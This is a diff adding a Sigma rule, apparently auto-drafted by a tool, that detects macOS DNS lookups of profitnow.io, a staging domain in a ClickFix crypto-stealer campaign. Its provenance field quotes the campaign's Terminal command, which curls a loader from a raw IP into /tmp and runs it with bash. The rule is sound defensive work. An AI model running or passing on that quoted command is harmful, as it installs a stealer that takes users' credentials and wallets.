@@ -1,0 +1,46 @@
+title: DNS Query to ClickFix Stealer Loader Domain profitnow.io
+id: cc897cb0-8834-4e44-a1cf-6cb4e1b05d49
+status: experimental
+description: Detects a DNS resolution attempt for profitnow.io, a domain observed in a macOS ClickFix
+  social-engineering campaign where victims were tricked into pasting a Terminal command that set SRC_URL
+  to this domain and downloaded a Bash loader executing Go-based stealer binaries. Any resolution of this
+  domain on a macOS endpoint warrants immediate investigation for follow-on loader execution and LaunchAgent
+  persistence activity.
+references:
+- https://www.huntress.com/blog/mac-crypto-draining-malware
+author: hecate (auto-generated draft - requires analyst review)
+date: '2026-11-25'
+tags:
+- attack.t1105
+- attack.t1204.004
+- attack.t1566.002
+logsource:
+  category: dns_query
+  product: macos
+detection:
+  selection:
+    QueryName: profitnow.io
+  condition: selection
+falsepositives:
+- Legitimate browsing to profitnow.io if the domain is repurposed or sinkholed after the campaign; verify
+  against process context and whether a Terminal or curl process initiated the query
+level: high
+hecate_provenance:
+- value: https://profitnow.io/
+  type: url
+  role: staging
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: export SRC_URL='https://profitnow[.]io/' && (cd /tmp && curl -kfsSL "http://193.29.224[.]151/92392991a0cca55?force=1"
+    -o .UlaccK && bash .UlaccK && rm -f .UlaccK)
+- value: profitnow.io
+  type: domain
+  role: staging
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: '`profitnow[.]io` Domain used during the ClickFix phase'
+hunt_id: H-0038
+hecate_review:
+  verdict: keep
